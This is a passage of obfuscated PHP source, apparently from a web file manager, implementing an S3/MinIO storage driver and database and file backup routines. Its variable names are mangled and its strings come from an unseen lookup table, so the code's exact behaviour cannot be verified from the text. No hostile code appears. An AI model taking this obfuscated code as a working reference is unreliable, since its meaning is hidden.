$ñÓğó˜ = empty($“üé²È) && $“üé²È !== $•ÚáÆïô[214] ? $•ÚáÆïô[12] : $“üé²È . $•ÚáÆïô[8]; $Ö«Íù› = null; $ˆ²Éª° = 500; $¡×÷ò = $•ÚáÆïô[8]; $ûÀ’ïå = $ÛûœÃü = array(); while (!0) { $óïŸ†Ÿ« = $this->listObjs($“üé²È, $Ö«Íù›, $ˆ²Éª°, $¡×÷ò); if (!$óïŸ†Ÿ«) { break; } $Ö«Íù› = $óïŸ†Ÿ«[$•ÚáÆïô[224]]; $½ô‘ŸĞ = $óïŸ†Ÿ«[$•ÚáÆïô[222]]; $ úÄµÂÁ = $óïŸ†Ÿ«[$•ÚáÆïô[223]]; if (empty($½ô‘ŸĞ) && empty($ úÄµÂÁ)) { break; } if (count($½ô‘ŸĞ) == 1 && $½ô‘ŸĞ[0][$•ÚáÆïô[32]] == $ñÓğó˜) { break; } if ($Ê¿ğÃäí) { if (count($½ô‘ŸĞ)) { $½ô‘ŸĞ = array_column($½ô‘ŸĞ, $•ÚáÆïô[32]); $ûÀ’ïå = array_merge($ûÀ’ïå, $½ô‘ŸĞ); } if (count($ úÄµÂÁ)) { $ úÄµÂÁ = array_column($ úÄµÂÁ, $•ÚáÆïô[32]); $ÛûœÃü = array_merge($ÛûœÃü, $ úÄµÂÁ); } if ($Ö«Íù› === null) { break; } continue; } if ($Ÿ¿…’ûá) { if (!empty($½ô‘ŸĞ)) { if (count($½ô‘ŸĞ) > 1 || isset($½ô‘ŸĞ[0][$•ÚáÆïô[32]]) && $½ô‘ŸĞ[0][$•ÚáÆïô[32]] != $ñÓğó˜) { return !0; } } } else { if (!empty($ úÄµÂÁ)) { return !0; } } if ($Ö«Íù› === null) { break; } } if ($Ê¿ğÃäí) { $ûÀ’ïå = array_diff($ûÀ’ïå, array($ñÓğó˜)); $ûÀ’ïå = count(array_unique($ûÀ’ïå)); $ÛûœÃü = count(array_unique($ÛûœÃü)); return array($•ÚáÆïô[225] => $ûÀ’ïå, $•ÚáÆïô[226] => $ÛûœÃü); } return !1; } public function listAll($ä™£­ì•) { $½®ôîí =& $_SERVER[•Ùç É]; $õäŞïª = $this->fileList($ä™£­ì•, $½®ôîí[12], !0); $°Ã ´· = array_to_keyvalue($õäŞïª[$½®ôîí[85]], $½®ôîí[32]); foreach ($õäŞïª[$½®ôîí[84]] as $–õîñÀ) { if (is_string($–õîñÀ)) { $°Ã ´·[$–õîñÀ] = array($½®ôîí[78] => 0); } } return $this->listAllFiles($ä™£­ì•, $°Ã ´·); } public function canRead($›Ï•ñÙ˜) { $¢Ÿ¡ò´ì =& $_SERVER[•Ùç É]; $Ëú€š¾Ö = $this->client->getAccessControlPolicy($this->bucket, $›Ï•ñÙ˜); if (!$Ëú€š¾Ö) { return !1; } return in_array($Ëú€š¾Ö, array($¢Ÿ¡ò´ì[227], $¢Ÿ¡ò´ì[228], $¢Ÿ¡ò´ì[229])) ? !0 : !1; } public function canWrite($ºÀğâ¿ş) { $¤–ÈÙµò =& $_SERVER[•Ùç É]; $‘á‘×Óğ = $this->client->getAccessControlPolicy($this->bucket, $ºÀğâ¿ş); if (!$‘á‘×Óğ) { return !1; } return in_array($‘á‘×Óğ, array($¤–ÈÙµò[227], $¤–ÈÙµò[228])) ? !0 : !1; } public function getContent($éœÚë£ä) { return $this->client->getObject($this->bucket, $éœÚë£ä); } public function setContent($è ãÇš, $»õ‹ıÓ = '', $ ³¥¥Ò¦ = false) { $û †Ç¹¯ =& $_SERVER[•Ùç É]; $è ãÇš = $ ³¥¥Ò¦ ? trim($è ãÇš, $û †Ç¹¯[8]) . $û †Ç¹¯[8] : $è ãÇš; $”•ÍÖ¤Â = get_file_mime(get_path_ext($è ãÇš)); $³Åˆš¬Î = $this->client->putObject($»õ‹ıÓ, $this->bucket, $è ãÇš, $û †Ç¹¯[215], array(), $”•ÍÖ¤Â); if (!$³Åˆš¬Î) { return !1; } if ($ ³¥¥Ò¦) { return !0; } $this->cacheMethod(null, null); $³Åˆš¬Î = $this->copyFile($è ãÇš, $è ãÇš, array($û †Ç¹¯[230] => $³Åˆš¬Î[$û †Ç¹¯[220]])); return $³Åˆš¬Î ? !0 : !1; } public function fileSubstr($Ê¬†­®¡, $×¹Îˆ´˜, $ĞñÍÜ¥«) { $ö€æ¼¯ = $×¹Îˆ´˜ + $ĞñÍÜ¥« - 1; return $this->client->getObject($this->bucket, $Ê¬†­®¡, array($_SERVER[•Ùç É][231] => "\x62\x79\x74\145\x73\75{$×¹Îˆ´˜}\x2d{$ö€æ¼¯}")); } public function upload($Í¾´®ò¤, $®ŠÖˆØ¬, $ş°õó˜ç = false, $Üˆ³ÌŸ” = REPEAT_REPLACE) { $¬ŸÈë ½ =& $_SERVER[•Ùç É]; $¨“ª–«Ÿ = array($¬ŸÈë ½[230] => @md5_file($®ŠÖˆØ¬)); $±œÎŒã¶ = array($¬ŸÈë ½[232] => get_file_mime(get_path_ext($Í¾´®ò¤))); if (IO::size($®ŠÖˆØ¬) <= 1024 * 1024 * 200) { $óµš É = $this->client->putObjectFile($®ŠÖˆØ¬, $this->bucket, $Í¾´®ò¤, $¬ŸÈë ½[215], $¨“ª–«Ÿ, $±œÎŒã¶); return !empty($óµš É) ? $this->getPathOuter($Í¾´®ò¤) : !1; } $¶ÑÂúÍ = $this->client->multiUploadObject($®ŠÖˆØ¬, $this->bucket, trim($Í¾´®ò¤, $¬ŸÈë ½[8]), $¨“ª–«Ÿ, $±œÎŒã¶); return $¶ÑÂúÍ ? $this->getPathOuter($Í¾´®ò¤) : !1; } public function download($·Öõ—•ˆ, $×ÏúÖÒè) { if (!@is_dir($this->pathFather($×ÏúÖÒè)) && !IO::mkdir($this->pathFather($×ÏúÖÒè))) { return !1; } $•ÀËÖÁñ = $this->client->getObject($this->bucket, $·Öõ—•ˆ, array(), $×ÏúÖÒè); return $•ÀËÖÁñ !== !1 ? $×ÏúÖÒè : !1; } public function link($™Ñ‡‰ñ, $‹˜’º = array()) { $½Ù¿®¥³ =& $_SERVER[•Ùç É]; if ($this->signVer == $½Ù¿®¥³[233]) { return $this->client->getAuthenticatedURL($this->bucket, $™Ñ‡‰ñ, 3600 * 12, $‹˜’º); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($™Ñ‡‰ñ, $½Ù¿®¥³[8]), 3600 * 12, $this->region, array(), !0, $‹˜’º); } public function fileOut($ø£ë™‹û, $—‰ù˜û¸ = false, $ÚêßàÉ¬ = false, $Äâëœ‰ = '') { $å«¦©Êı =& $_SERVER[•Ùç É]; if ($this->isFileOutServer()) { return $this->fileOutServer($ø£ë™‹û, $—‰ù˜û¸, $ÚêßàÉ¬, $Äâëœ‰); } if (!$ÚêßàÉ¬) { $ÚêßàÉ¬ = $this->pathThis($ø£ë™‹û); } $¾°ÇÓØÀ = get_file_mime(get_path_ext($ÚêßàÉ¬)); if ($¾°ÇÓØÀ == $å«¦©Êı[234]) { return parent::fileOut($ø£ë™‹û, $—‰ù˜û¸, $ÚêßàÉ¬, $Äâëœ‰); } $ÈúÍ¤Îä = array($å«¦©Êı[235] => $¾°ÇÓØÀ); if ($—‰ù˜û¸) { $ÈúÍ¤Îä[$å«¦©Êı[236]] = $å«¦©Êı[237] . rawurlencode($ÚêßàÉ¬); } else { } $Ê¹‰×ú = $this->link($ø£ë™‹û, $ÈúÍ¤Îä); $this->fileOutLink($Ê¹‰×ú); } public function fileOutServer($Úûş‚©õ, $¥Š×²´ = false, $×ë’‹ = false, $î«Õ”° = '') { parent::fileOut($Úûş‚©õ, $¥Š×²´, $×ë’‹, $î«Õ”°); } public function fileOutImageServer($ö¤¯“¢ş, $ïı¿»¨ = 250) { parent::fileOutImage($ö¤¯“¢ş, $ïı¿»¨); } public function hashMd5($§óû¡èé, $•Ù­ÜÖ‘ = '') { $©ËŠ’É =& $_SERVER[•Ùç É]; $¬ÅğìÁ” = $this->objectMeta($§óû¡èé); if (!$¬ÅğìÁ”) { return !1; } $•Ù­ÜÖ‘ = $•Ù­ÜÖ‘ ? $•Ù­ÜÖ‘ : _get($¬ÅğìÁ”, $©ËŠ’É[238]); $•Ù­ÜÖ‘ = $•Ù­ÜÖ‘ ? $•Ù­ÜÖ‘ : _get($¬ÅğìÁ”, $©ËŠ’É[220], $©ËŠ’É[12]); return $•Ù­ÜÖ‘; } public function uploadFormData($ó¿ÚˆßÂ, $¢®²¶¾œ = 3600) { $øªñĞğ =& $_SERVER[•Ùç É]; $‘ƒÓÅ§ı = $this->pathFather($ó¿ÚˆßÂ); $²†«•ñ® = $this->client->getHttpUploadPostParams($this->bucket, $‘ƒÓÅ§ı, $øªñĞğ[215], $¢®²¶¾œ); return array_merge((array) $²†«•ñ®, array($øªñĞğ[198] => $this->getHost())); } public function multiUploadFormData($±¬¯×ùÏ, $ğè²áµÌ = 3600) { $ÂÔãƒäÌ =& $_SERVER[•Ùç É]; $¼âÔŠù¶ = gmdate($ÂÔãƒäÌ[239]); $â–Ä»‹Î = array(); $é»Ÿö›œ = $this->client->getUploadId($this->bucket, $±¬¯×ùÏ, $â–Ä»‹Î); if (!$é»Ÿö›œ) { return !1; } return array($ÂÔãƒäÌ[240] => $é»Ÿö›œ, $ÂÔãƒäÌ[198] => $this->getHost() . $ÂÔãƒäÌ[8] . $this->pathEncode($±¬¯×ùÏ), $ÂÔãƒäÌ[241] => $¼âÔŠù¶, $ÂÔãƒäÌ[96] => $±¬¯×ùÏ); } public function multiUploadAuthData($õ²‚¿ñà, $—©ş¼ó¬ = array()) { $—ùšÕÍ” =& $_SERVER[•Ùç É]; $şöÄ ïÎ = isset($—©ş¼ó¬[$—ùšÕÍ”[241]]) ? $—©ş¼ó¬[$—ùšÕÍ”[241]] : gmdate($—ùšÕÍ”[239]); $ëÍÊÅ¤¾ = isset($—©ş¼ó¬[$—ùšÕÍ”[177]]) ? $—©ş¼ó¬[$—ùšÕÍ”[177]] : $—ùšÕÍ”[12]; $¦» µ½¦ = $—©ş¼ó¬[$—ùšÕÍ”[96]]; unset($—©ş¼ó¬[$—ùšÕÍ”[96]]); if (isset($—©ş¼ó¬[$—ùšÕÍ”[242]])) { $—©ş¼ó¬[$—ùšÕÍ”[241]] = $şöÄ ïÎ; return $this->listUploadParts($¦» µ½¦, $—©ş¼ó¬); } $ì×©Í = array($—ùšÕÍ”[243], $—ùšÕÍ”[12], $—ùšÕÍ”[122], $—ùšÕÍ”[12], "\170\55\x61\155\172\55\144\141\164\145\x3a{$şöÄ ïÎ}", $—ùšÕÍ”[8] . $this->bucket . $—ùšÕÍ”[8] . $this->pathEncode($¦» µ½¦) . $ëÍÊÅ¤¾); if (strpos($ëÍÊÅ¤¾, $—ùšÕÍ”[244]) === 0) { $ì×©Í[0] = $—ùšÕÍ”[245]; } if (isset($—©ş¼ó¬[$—ùšÕÍ”[246]]) && $—©ş¼ó¬[$—ùšÕÍ”[246]] == $—ùšÕÍ”[247]) { $ì×©Í[0] = $—ùšÕÍ”[247]; } $ŸóÌø•ü = implode($—ùšÕÍ”[248], $ì×©Í); $ñ„ûÈğ• = base64_encode(hash_hmac($—ùšÕÍ”[249], $ŸóÌø•ü, $this->secret, !0)); $»¸ÖŞµ = $—ùšÕÍ”[250] . $this->accessKey . $—ùšÕÍ”[4] . $ñ„ûÈğ•; if (strpos($ëÍÊÅ¤¾, $—ùšÕÍ”[244]) === 0) { return array($—ùšÕÍ”[251] => $»¸ÖŞµ, $—ùšÕÍ”[241] => $şöÄ ïÎ); } return $»¸ÖŞµ; } public function listUploadParts($ÛĞ±çšô, $¬ŠÛÈ¸ = array()) { $òßü³ÒÊ =& $_SERVER[•Ùç É]; $‡Ô·º‘ = str_replace($òßü³ÒÊ[252], $òßü³ÒÊ[12], $¬ŠÛÈ¸[$òßü³ÒÊ[177]]); $ì½®íßö = $this->client->listParts($this->bucket, $ÛĞ±çšô, $‡Ô·º‘); if (!$ì½®íßö) { return !1; } unset($¬ŠÛÈ¸[$òßü³ÒÊ[242]], $¬ŠÛÈ¸[$òßü³ÒÊ[246]]); $¬ŠÛÈ¸[$òßü³ÒÊ[96]] = $ÛĞ±çšô; $ ‰†ò’ª = $this->multiUploadAuthData($ÛĞ±çšô, $¬ŠÛÈ¸); if (empty($ ‰†ò’ª)) { return !1; } return array($òßü³ÒÊ[251] => $ ‰†ò’ª, $òßü³ÒÊ[241] => $¬ŠÛÈ¸[$òßü³ÒÊ[241]], $òßü³ÒÊ[253] => $ì½®íßö); } public function getHost() { return parent::getHost() . $_SERVER[•Ùç É][8] . $this->bucket; } public function size($Éù¢áû) { $©½öÔ = $this->objectMeta($Éù¢áû); return $©½öÔ ? $©½öÔ[$_SERVER[•Ùç É][78]] : 0; } public function info($œ»°¿şŠ) { if ($this->isFolder($œ»°¿şŠ)) { return $this->folderInfo($œ»°¿şŠ); } else { if ($this->isFile($œ»°¿şŠ)) { return $this->fileInfo($œ»°¿şŠ); } } return !1; } public function exist($Æ¢Äƒâ‹) { return $this->isFile($Æ¢Äƒâ‹) || $this->isFolder($Æ¢Äƒâ‹); } public function isFile($Çä®µˆœ) { return !$this->isFolder($Çä®µˆœ) && $this->objectMeta($Çä®µˆœ); } public function isFolder($‰èƒú) { return $this->cacheMethod($_SERVER[•Ùç É][168], $‰èƒú); } protected function objectMeta($±‹ÄÒÑ) { return $this->cacheMethod($_SERVER[•Ùç É][170], $±‹ÄÒÑ); } protected function _objectMeta($¡‘Ç¨¬Î) { $‚€¨ïøË =& $_SERVER[•Ùç É]; $¡‘Ç¨¬Î = rtrim($¡‘Ç¨¬Î, $‚€¨ïøË[8]); try { $Œºü”Ä = $this->client->getObjectInfo($this->bucket, $¡‘Ç¨¬Î); if (!isset($Œºü”Ä[$‚€¨ïøË[238]]) && isset($Œºü”Ä[$‚€¨ïøË[254]])) { $Œºü”Ä[$‚€¨ïøË[238]] = $Œºü”Ä[$‚€¨ïøË[254]]; } } catch (Exception $¡ÃÉ‚Ğ) { $Œºü”Ä = !1; } if (!$Œºü”Ä) { } return $Œºü”Ä; } protected function _isFolder($®ê™Åº) { $î¼µîÊ =& $_SERVER[•Ùç É]; $®ê™Åº = rtrim($®ê™Åº, $î¼µîÊ[8]); if ($®ê™Åº == $î¼µîÊ[12] || $®ê™Åº == $î¼µîÊ[8]) { return !0; } $Ú’óÔÅ = $this->client->getBucket($this->bucket, $®ê™Åº, null, 1); if (empty($Ú’óÔÅ[$î¼µîÊ[222]])) { return !1; } $¡€¿·ê = $Ú’óÔÅ[$î¼µîÊ[222]][0][$î¼µîÊ[32]]; return stripos($¡€¿·ê, $®ê™Åº . $î¼µîÊ[8]) === 0 ? !0 : !1; if (substr($¡€¿·ê, -1) == $î¼µîÊ[8]) { return !0; } if (get_path_this($¡€¿·ê) == get_path_this($®ê™Åº)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($±Ô«…¸Ô) { parent::__construct($±Ô«…¸Ô); $this->signatureVersion($_SERVER[•Ùç É][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($¨ñéñ®, $£¯ù›“÷ = 3600) { $‹²¨¢ƒœ =& $_SERVER[•Ùç É]; $şãÒçŠõ = $‹²¨¢ƒœ[215]; $®Î±†ùí = $‹²¨¢ƒœ[255]; $ƒÀĞèœÑ = $‹²¨¢ƒœ[62]; $‡âù¹¯« = gmdate($‹²¨¢ƒœ[256]); $Ûğ°äİ¶ = gmdate($‹²¨¢ƒœ[257]); $·Ö»É´ = $‹²¨¢ƒœ[258]; $‘ª¬¨£Ç = $£¯ù›“÷ . $‹²¨¢ƒœ[12]; $¢îÙÛ = $‹²¨¢ƒœ[259]; $™Ã”ÆË = array($this->accessKey, $Ûğ°äİ¶, $this->region, $ƒÀĞèœÑ, $·Ö»É´); $Ûğûâ¶¢ = implode($‹²¨¢ƒœ[8], $™Ã”ÆË); $×ßÍ¯…Û = array($‹²¨¢ƒœ[260] => gmdate($‹²¨¢ƒœ[261], strtotime($‹²¨¢ƒœ[262])), $‹²¨¢ƒœ[263] => array(array($‹²¨¢ƒœ[264] => $this->bucket), array($‹²¨¢ƒœ[265] => $şãÒçŠõ), array($‹²¨¢ƒœ[266], $‹²¨¢ƒœ[267], $‹²¨¢ƒœ[12]), array($‹²¨¢ƒœ[266], $‹²¨¢ƒœ[268], $‹²¨¢ƒœ[12]), array($‹²¨¢ƒœ[266], $‹²¨¢ƒœ[269], $‹²¨¢ƒœ[12]), array($‹²¨¢ƒœ[270] => $¢îÙÛ), array($‹²¨¢ƒœ[271] => $Ûğûâ¶¢), array($‹²¨¢ƒœ[272] => $®Î±†ùí), array($‹²¨¢ƒœ[273] => $‡âù¹¯«), array($‹²¨¢ƒœ[274] => $‘ª¬¨£Ç))); $™ƒ÷¦¸ = base64_encode(json_encode($×ßÍ¯…Û)); $ËÃ—Û‰ = hash_hmac($‹²¨¢ƒœ[275], $Ûğ°äİ¶, $‹²¨¢ƒœ[276] . $this->secret, !0); $û³±¶ŒÔ = hash_hmac($‹²¨¢ƒœ[275], $this->region, $ËÃ—Û‰, !0); $Õ÷¯Õà = hash_hmac($‹²¨¢ƒœ[275], $ƒÀĞèœÑ, $û³±¶ŒÔ, !0); $¶éÊ†‰É = hash_hmac($‹²¨¢ƒœ[275], $·Ö»É´, $Õ÷¯Õà, !0); $¡¾¹éú = hash_hmac($‹²¨¢ƒœ[275], $™ƒ÷¦¸, $¶éÊ†‰É); $ˆ‡í™Ë¦ = array($‹²¨¢ƒœ[232] => $‹²¨¢ƒœ[12], $‹²¨¢ƒœ[277] => $‹²¨¢ƒœ[12], $‹²¨¢ƒœ[265] => $şãÒçŠõ, $‹²¨¢ƒœ[270] => $¢îÙÛ, $‹²¨¢ƒœ[278] => $™ƒ÷¦¸, $‹²¨¢ƒœ[279] => $Ûğûâ¶¢, $‹²¨¢ƒœ[280] => $®Î±†ùí, $‹²¨¢ƒœ[281] => $‡âù¹¯«, $‹²¨¢ƒœ[282] => $‘ª¬¨£Ç, $‹²¨¢ƒœ[283] => $¡¾¹éú, $‹²¨¢ƒœ[198] => $this->getHost()); return $ˆ‡í™Ë¦; } } goto E†çØ¶á‘±; bÓÀöÖô : class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $†ğƒà‘… =& $_SERVER[•Ùç É]; $this->isManual(); self::$name = date($†ğƒà‘…[793]); if (!($óÚÜ¦¼ = Model($†ğƒà‘…[794])->lastItem())) { $óÚÜ¦¼ = $this->initData(); } else { self::$name = $óÚÜ¦¼[$†ğƒà‘…[32]]; if ($óÚÜ¦¼[$†ğƒà‘…[795]] == $†ğƒà‘…[90]) { self::$name = date($†ğƒà‘…[257]); $•®—ßğ = 0; if (isset($óÚÜ¦¼[$†ğƒà‘…[339]][$†ğƒà‘…[216]][$†ğƒà‘…[511]])) { $•®—ßğ = (int) $óÚÜ¦¼[$†ğƒà‘…[339]][$†ğƒà‘…[216]][$†ğƒà‘…[511]]; } if (self::$manual == 0 && $óÚÜ¦¼[$†ğƒà‘…[32]] == self::$name) { Model($†ğƒà‘…[794])->remove($óÚÜ¦¼[$†ğƒà‘…[445]]); } $óÚÜ¦¼ = $this->initData($•®—ßğ, $óÚÜ¦¼[$†ğƒà‘…[796]]); } else { $this->checkStore($óÚÜ¦¼[$†ğƒà‘…[796]]); } } self::$option = $óÚÜ¦¼; } private function isManual() { $“áˆ½ÊÑ = _get($GLOBALS, $_SERVER[•Ùç É][797], 0); $“áˆ½ÊÑ = intval($“áˆ½ÊÑ); self::$manual = $“áˆ½ÊÑ && $“áˆ½ÊÑ == 1 ? 1 : 0; } private function initData($¦Íá—¦ = 0, $ü×½Ë  = '') { $™âäé‰ =& $_SERVER[•Ùç É]; $í†¿€¯Ô = Model($™âäé‰[794])->config(); if ($ü×½Ë  && $í†¿€¯Ô[$™âäé‰[796]] != $ü×½Ë ) { $¦Íá—¦ = 0; } $this->checkStore($í†¿€¯Ô[$™âäé‰[796]]); if (self::$manual == 1) { self::$name .= $™âäé‰[11] . date($™âäé‰[798]); } $ë÷ƒÎ¯ = array($™âäé‰[796] => $í†¿€¯Ô[$™âäé‰[796]], $™âäé‰[32] => self::$name, $™âäé‰[795] => 0, $™âäé‰[799] => $í†¿€¯Ô[$™âäé‰[799]], $™âäé‰[800] => self::$manual, $™âäé‰[339] => array($™âäé‰[801] => array($™âäé‰[795] => 0), $™âäé‰[802] => array($™âäé‰[795] => 0, $™âäé‰[803] => 0, $™âäé‰[804] => 0, $™âäé‰[33] => $™âäé‰[12], $™âäé‰[805] => 0, $™âäé‰[806] => 0), $™âäé‰[807] => array($™âäé‰[795] => 0, $™âäé‰[803] => 0, $™âäé‰[804] => 0, $™âäé‰[805] => 0, $™âäé‰[806] => 0), $™âäé‰[216] => array($™âäé‰[795] => 0, $™âäé‰[808] => 0, $™âäé‰[809] => 0, $™âäé‰[810] => 0, $™âäé‰[811] => 0, $™âäé‰[511] => $¦Íá—¦, $™âäé‰[805] => 0, $™âäé‰[806] => 0)), $™âäé‰[805] => time(), $™âäé‰[806] => 0); $š©¤Òæ° = Model($™âäé‰[794])->insert($ë÷ƒÎ¯); $ë÷ƒÎ¯[$™âäé‰[445]] = $š©¤Òæ°; return $ë÷ƒÎ¯; } private function checkStore($„õö–Ğì) { $Óã¢†‰Ø =& $_SERVER[•Ùç É]; $ŒÔ«öŒ = Model($Óã¢†‰Ø[812])->listData($„õö–Ğì); Model($Óã¢†‰Ø[812])->checkConfig($ŒÔ«öŒ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[•Ùç É][794])->findByName(self::$name); } return self::$option; } public static function set($£ÏÄ›Ú¶) { $ò¯Ê‹ÑØ =& $_SERVER[•Ùç É]; $éËûá¢´ = self::get(); foreach ($£ÏÄ›Ú¶ as $¾ûª‹ï÷ => $ºš¶İâ) { $Ø”›±ßç = explode($ò¯Ê‹ÑØ[10], $¾ûª‹ï÷); $×ÑÕí®¦ = count($Ø”›±ßç); switch ($×ÑÕí®¦) { case 1: $éËûá¢´[$Ø”›±ßç[0]] = $ºš¶İâ; break; case 2: $éËûá¢´[$Ø”›±ßç[0]][$Ø”›±ßç[1]] = $ºš¶İâ; break; case 3: $éËûá¢´[$Ø”›±ßç[0]][$Ø”›±ßç[1]][$Ø”›±ßç[2]] = $ºš¶İâ; break; } } Model($ò¯Ê‹ÑØ[794])->update($éËûá¢´[$ò¯Ê‹ÑØ[445]], $éËûá¢´); self::$option = $éËûá¢´; return self::$option; } public function keep() { $—ìœÅ‘â =& $_SERVER[•Ùç É]; $«Öã€Åş = self::get(); if ($«Öã€Åş[$—ìœÅ‘â[339]][$—ìœÅ‘â[801]][$—ìœÅ‘â[795]] == $—ìœÅ‘â[90]) { return; } $this->backupKeep($«Öã€Åş); self::set(array($—ìœÅ‘â[813] => 1)); } private function backupKeep($Î—‚ÃùÏ) { $ƒõ—ûÕˆ =& $_SERVER[•Ùç É]; if (self::$manual == 1) { return; } $ùä¾Ğ´ = Model($ƒõ—ûÕˆ[794])->listData(); if (empty($ùä¾Ğ´)) { return; } $çæŒê˜í = 0; $ŸãÕöûâ = array(); foreach ($ùä¾Ğ´ as $ÊíÃ¹¦×) { if ($çæŒê˜í >= 7) { break; } $ŸãÕöûâ[] = $ÊíÃ¹¦×[$ƒõ—ûÕˆ[32]]; $çæŒê˜í++; } for ($çæŒê˜í = 0; $çæŒê˜í < 12; $çæŒê˜í++) { $ŸãÕöûâ[] = date($ƒõ—ûÕˆ[814], strtotime("\x2d{$çæŒê˜í}\x20\155\x6f\x6e\164\x68\x73")); } $ŸãÕöûâ = array_unique($ŸãÕöûâ); $®¬÷¬¸µ = Model($ƒõ—ûÕˆ[815])->get($ƒõ—ûÕˆ[816]); foreach ($ùä¾Ğ´ as $ÊíÃ¹¦×) { if (isset($ÊíÃ¹¦×[$ƒõ—ûÕˆ[800]]) && $ÊíÃ¹¦×[$ƒõ—ûÕˆ[800]] == $ƒõ—ûÕˆ[90]) { continue; } if (!empty($ÊíÃ¹¦×[$ƒõ—ûÕˆ[32]]) && in_array($ÊíÃ¹¦×[$ƒõ—ûÕˆ[32]], $ŸãÕöûâ)) { continue; } Model($ƒõ—ûÕˆ[794])->remove($ÊíÃ¹¦×[$ƒõ—ûÕˆ[445]]); $—çö = $this->backupPath($Î—‚ÃùÏ, $®¬÷¬¸µ); IO::remove($—çö, !1); } } private function backupPath($©¾´¤ú , $×Ì‹œ†Ä = false) { $Çî¾¯µ =& $_SERVER[•Ùç É]; if (!$×Ì‹œ†Ä) { $×Ì‹œ†Ä = Model($Çî¾¯µ[815])->get($Çî¾¯µ[816]); } $ÈŒÃÙÜ = $©¾´¤ú [$Çî¾¯µ[32]]; $«ï“×÷Š = substr(md5($Çî¾¯µ[817] . $×Ì‹œ†Ä . $ÈŒÃÙÜ), 0, 8); return "\173\151\157\72{$©¾´¤ú [$Çî¾¯µ[796]]}\x7d\57\x64\141\164\x61\142\141\x73\145\x2f\142\141\143\153\165\160\57" . $ÈŒÃÙÜ . $Çî¾¯µ[11] . $«ï“×÷Š; } public function db() { $Ú§¡Ş‘‹ =& $_SERVER[•Ùç É]; $®öúîäü = self::get(); if ($®öúîäü[$Ú§¡Ş‘‹[339]][$Ú§¡Ş‘‹[802]][$Ú§¡Ş‘‹[795]] == $Ú§¡Ş‘‹[90]) { return !0; } $¹µ°±¢ = new BackupDb(); if (!$¹µ°±¢->index()) { return !1; } self::set(array($Ú§¡Ş‘‹[818] => 1)); return !0; } public function dbFile() { $µ…ùÚ¥ú =& $_SERVER[•Ùç É]; $òóø€Û = self::get(); if ($òóø€Û[$µ…ùÚ¥ú[339]][$µ…ùÚ¥ú[807]][$µ…ùÚ¥ú[795]] == $µ…ùÚ¥ú[90]) { return !0; } $ƒÑõÔä’ = new BackupDbFile(); if (!$ƒÑõÔä’->index()) { return !1; } self::set(array($µ…ùÚ¥ú[819] => 1)); return !0; } public function file() { $ø•™¾³¦ =& $_SERVER[•Ùç É]; $°“ä¹å = self::get(); if ($°“ä¹å[$ø•™¾³¦[339]][$ø•™¾³¦[216]][$ø•™¾³¦[795]] == $ø•™¾³¦[90]) { return !0; } if (!isset($°“ä¹å[$ø•™¾³¦[799]]) || $°“ä¹å[$ø•™¾³¦[799]] == $ø•™¾³¦[214]) { $‘¡óóÂÖ = new BackupFile(); if (!$‘¡óóÂÖ->index()) { return !1; } } self::set(array($ø•™¾³¦[820] => 1, $ø•™¾³¦[795] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $§Şß›í’ =& $_SERVER[•Ùç É]; $Öú í›ì = Backup::get(); self::$io = $Öú í›ì[$§Şß›í’[796]]; self::$name = $Öú í›ì[$§Şß›í’[32]]; $¼‡œ½¿ = new DbManage(); $¶©’ËÖ‚ = $¼‡œ½¿->dbType(); $º“ò”Œ = array($§Şß›í’[821] => $¶©’ËÖ‚, $§Şß›í’[822] => time()); Backup::set($º“ò”Œ); $Ÿ”Ñ‰œô = $this->tmpFilesPath() . $§Şß›í’[823] . self::$name . $§Şß›í’[8]; del_dir($Ÿ”Ñ‰œô); mk_dir($Ÿ”Ñ‰œô); $âüŸÖ´İ = $´€‘×÷¹ = 0; $¨û¤ = new Task($§Şß›í’[824], $§Şß›í’[825], 0, LNG($§Şß›í’[826]) . $§Şß›í’[827] . LNG($§Şß›í’[828])); try { $ŞÑÜÃÛù = $¼‡œ½¿->db()->getTables(); } catch (Exception $ˆ¿úı˜İ) { $¨û¤->end(); return !1; } $ŞÑÜÃÛù = array_diff($ŞÑÜÃÛù, array($§Şß›í’[829], $§Şß›í’[830])); foreach ($ŞÑÜÃÛù as $€¨Ø€ıß) { $âüŸÖ´İ += $¼‡œ½¿->model($€¨Ø€ıß)->count(); } $¨û¤->task[$§Şß›í’[831]] = $âüŸÖ´İ; $GLOBALS[$§Şß›í’[832]] = self::$name; foreach ($ŞÑÜÃÛù as $€¨Ø€ıß) { $ÓâäÍ = $Ÿ”Ñ‰œô . $€¨Ø€ıß . $§Şß›í’[833]; $õéŞâ‹ = null; if ($€¨Ø€ıß == $§Şß›í’[834] && (!isset($Öú í›ì[$§Şß›í’[799]]) || $Öú í›ì[$§Şß›í’[799]] == $§Şß›í’[214])) { $õéŞâ‹ = self::$io; } $´€‘×÷¹ += $¼‡œ½¿->sqlFromDb($€¨Ø€ıß, $ÓâäÍ, $¨û¤, $õéŞâ‹); } unset($GLOBALS[$§Şß›í’[832]]); $¨û¤->end(); if ($´€‘×÷¹ > $âüŸÖ´İ) { $âüŸÖ´İ = $´€‘×÷¹; } $º“ò”Œ = array($§Şß›í’[821] => $¶©’ËÖ‚, $§Şß›í’[818] => 1, $§Şß›í’[835] => $âüŸÖ´İ, $§Şß›í’[836] => $´€‘×÷¹, $§Şß›í’[837] => time()); Backup::set($º“ò”Œ); if ($âüŸÖ´İ - $´€‘×÷¹ > 1) { $ÛˆĞ´ƒÎ = $§Şß›í’[838]; if (stristr(I18n::getType(), $§Şß›í’[839])) { $ÛˆĞ´ƒÎ = $§Şß›í’[840]; } write_log(array($ÛˆĞ´ƒÎ, $º“ò”Œ), $§Şß›í’[825]); return !1; } return !0; } private function tmpFilesPath() { $ÛŞñéëï =& $_SERVER[•Ùç É]; $ÌØÛ‹•Ù = TEMP_FILES; if ($GLOBALS[$ÛŞñéëï[6]][$ÛŞñéëï[91]][$ÛŞñéëï[841]]) { $ÌØÛ‹•Ù = $GLOBALS[$ÛŞñéëï[6]][$ÛŞñéëï[91]][$ÛŞñéëï[841]]; if (!mk_dir($ÌØÛ‹•Ù) || !is_writable($ÌØÛ‹•Ù) || 